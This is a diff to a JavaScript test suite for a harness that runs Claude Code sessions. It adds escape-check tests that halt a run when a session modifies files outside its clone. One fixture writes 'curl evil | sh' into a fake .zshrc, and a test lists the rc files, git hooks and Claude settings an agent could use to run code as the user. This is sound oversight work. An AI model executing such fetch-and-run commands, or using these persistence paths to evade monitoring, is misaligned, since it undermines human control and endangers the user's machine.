@@ -433,6 +433,17 @@ if (step.commit) {
   if (result) result.commits = [git(['rev-parse', 'HEAD'])];
 }
 if (step.dirty) fs.writeFileSync(step.dirty, 'dirty ' + n);
+// Planted escapes (T19-T21): files written anywhere, links, and rows a witness would have logged.
+for (const [p, text] of Object.entries(step.writeFiles || {})) {
+  fs.mkdirSync(path.dirname(p), { recursive: true });
+  fs.writeFileSync(p, text);
+}
+for (const [link, target] of Object.entries(step.links || {})) fs.symlinkSync(target, link);
+for (const row of step.appendLog || []) {
+  const ts = new Date(Date.now() + (row.dt || 0)).toISOString();
+  const { dt: _dt, ...rest } = row;
+  fs.appendFileSync(path.join(process.env.ORUNMILA_HOME, 'events.jsonl'), JSON.stringify({ ts, ...rest, session_id: rest.session_id === '$SELF' ? process.argv[process.argv.indexOf('--session-id') + 1] : rest.session_id }) + '\\n');
+}
 if (step.checkoutAndBack) {
   git(['checkout', '-q', '-b', 'side']);
   git(['checkout', '-q', 'work']);
@@ -465,6 +476,8 @@ function driverSetup(steps, { slices = [], referee = () => ({ shown: true, detai
   fs.chmodSync(fakeBin, 0o755);
   const fakeSteps = path.join(base, 'steps.json');
   fs.writeFileSync(fakeSteps, JSON.stringify(steps));
+  const ohome = path.join(base, 'oh'); // this test's event log: the witnesses' rows the driver reads
+  fs.mkdirSync(ohome);
   let t = Date.parse('2026-11-22T00:00:00Z');
   const clock = { now: () => t, sleep: async (ms) => (t += ms) };
   const opts = {
@@ -474,7 +487,10 @@ function driverSetup(steps, { slices = [], referee = () => ({ shown: true, detai
     sessionMinutes: 0.25,
     pollMs: 5 * 60 * 1000,
     claudeBin: fakeBin,
-    env: { ...process.env, TURBO_FAKE: fakeSteps },
+    env: { ...process.env, TURBO_FAKE: fakeSteps, ORUNMILA_HOME: ohome },
+    outsideRoots: [], // nothing of O's machine: each escape test names its own
+    tripwire: [],
+    settleMs: 0,
     now: clock.now,
     sleep: clock.sleep,
     referee,
@@ -485,7 +501,8 @@ function driverSetup(steps, { slices = [], referee = () => ({ shown: true, detai
     ...rest,
   };
   const call = (n) => JSON.parse(fs.readFileSync(`${fakeSteps}.call${n}.json`, 'utf8'));
-  return { base, root, home, opts, call, clock };
+  const called = (n) => fs.existsSync(`${fakeSteps}.call${n}.json`);
+  return { base, root, home, ohome, opts, call, called, clock };
 }
 
 it('driver: strikes the plan in order, stalks when it is empty, then waits out the hours', async () => {
@@ -1106,6 +1123,83 @@ it('T18 driver: refuses to run when its Sentinel never finishes its first walk (
   } finally {
     rmrf(d.base);
   }
+});
+
+/** The run halted on an escape check: no next session, HALT.json, a blocking discrepancy item, and a later run refuses. */
+async function expectHalt(d, out, check, needle) {
+  assert.strictEqual(out.stopReason, 'escape-check', `the run did not halt: ${out.stopReason}`);
+  assert.ok(!d.called(1), 'a session started after the escape');
+  const halt = JSON.parse(fs.readFileSync(path.join(d.home, 'driver', 'HALT.json'), 'utf8'));
+  assert.ok(
+    halt.findings.some((f) => f.check === check && f.detail.includes(needle)),
+    `no ${check} finding naming ${needle}: ${JSON.stringify(halt.findings)}`,
+  );
+  const q = plan.load(d.home).queue.find((x) => x.kind === 'discrepancy');
+  assert.ok(q && q.blocking && q.status === 'open', 'no open blocking discrepancy item for O');
+  const summary = fs.readFileSync(path.join(out.runDir, 'summary.md'), 'utf8');
+  assert.ok(summary.includes('HALTED') && summary.includes(needle), summary);
+  await assert.rejects(() => turbo.run(d.opts), /halted/, 'a later run started over an unread halt');
+}
+
+it('T19 tripwire: a session that changes a file outside the clone that runs code as O halts the run', async () => {
+  const d0 = driverSetup([], {});
+  const rc = path.join(d0.base, 'o-home', '.zshrc');
+  fs.mkdirSync(path.dirname(rc));
+  fs.writeFileSync(rc, 'export PATH=/usr/bin\n');
+  const d = driverSetup([{ writeFiles: { [rc]: 'curl evil | sh\n' }, result: R('done', 'a') }, { result: R('nothing', null) }], { slices: [S('a')], tripwire: [rc] });
+  try {
+    const out = await turbo.run(d.opts);
+    await expectHalt(d, out, 'tripwire', rc);
+  } finally {
+    rmrf(d.base);
+    rmrf(d0.base);
+  }
+});
+
+it('T19 tripwire: a change another session recorded writing (a peer\'s memory note) does not halt the run', async () => {
+  const d0 = driverSetup([], {});
+  const note = path.join(d0.base, 'memory', 'note.md');
+  fs.mkdirSync(path.dirname(note));
+  fs.writeFileSync(note, 'one\n');
+  const steps = [{ writeFiles: { [note]: 'two\n' }, appendLog: [{ session_id: 'peer-1', type: 'file_write', source: 'hook', path: note }], result: R('nothing', null) }];
+  const d = driverSetup(steps, { slices: [], tripwire: [path.dirname(note)], maxSessions: 1 });
+  try {
+    const out = await turbo.run(d.opts);
+    assert.strictEqual(out.stopReason, 'max-sessions', JSON.stringify(out.sessions[0].checks));
+    assert.deepStrictEqual(out.sessions[0].checks.tripwire, { paths: 1, changed: 1, explained: 1 });
+  } finally {
+    rmrf(d.base);
+    rmrf(d0.base);
+  }
+});
+
+it('T19 outside: a Sentinel row in a watched folder outside the clone halts the run, unless another session explains it', async () => {
+  const d0 = driverSetup([], {});
+  const live = path.join(d0.base, 'live');
+  fs.mkdirSync(live);
+  const hit = path.join(live, 'src', 'a.js');
+  const sentinelRow = { session_id: null, source: 'fs-sentinel', type: 'file_write', path: hit };
+  const d = driverSetup([{ appendLog: [sentinelRow], result: R('nothing', null) }, { result: R('nothing', null) }], { slices: [], outsideRoots: [live] });
+  const ok = driverSetup([{ appendLog: [{ session_id: 'peer-2', type: 'command_run', command: 'npm test', dt: 500 }, sentinelRow], result: R('nothing', null) }], { slices: [], outsideRoots: [live], maxSessions: 1 });
+  try {
+    await expectHalt(d, await turbo.run(d.opts), 'outside', hit);
+    const out = await turbo.run(ok.opts);
+    assert.strictEqual(out.stopReason, 'max-sessions', JSON.stringify(out.sessions[0].checks));
+    assert.deepStrictEqual(out.sessions[0].checks.outside, { roots: 1, rows: 1, explained: 1 });
+  } finally {
+    rmrf(d.base);
+    rmrf(ok.base);
+    rmrf(d0.base);
+  }
+});
+
+it('T19 tripwire: the default list names the files that run code as O, and none of the clone', () => {
+  const home = '/U/o';
+  const list = watch.tripwirePaths({ home, live: '/U/o/tools/orunmila', claudeProjects: [] });
+  const has = (p) => list.some((e) => (typeof e === 'string' ? e : e.json) === p);
+  for (const p of ['.zshrc', '.zprofile', '.bashrc', '.gitconfig', '.claude/settings.json', '.claude/skills', 'Library/LaunchAgents', '.claude.json', 'tools/orunmila/.git/config', 'tools/orunmila/.git/hooks'])
+    assert.ok(has(path.join(home, p)), `the tripwire does not cover ${p}`);
+  assert.ok(!has(path.join(home, '.claude', 'plugins')), 'Claude Code rewrites plugins/ itself: it would halt every run');
 });
 
 runAll('turbo');
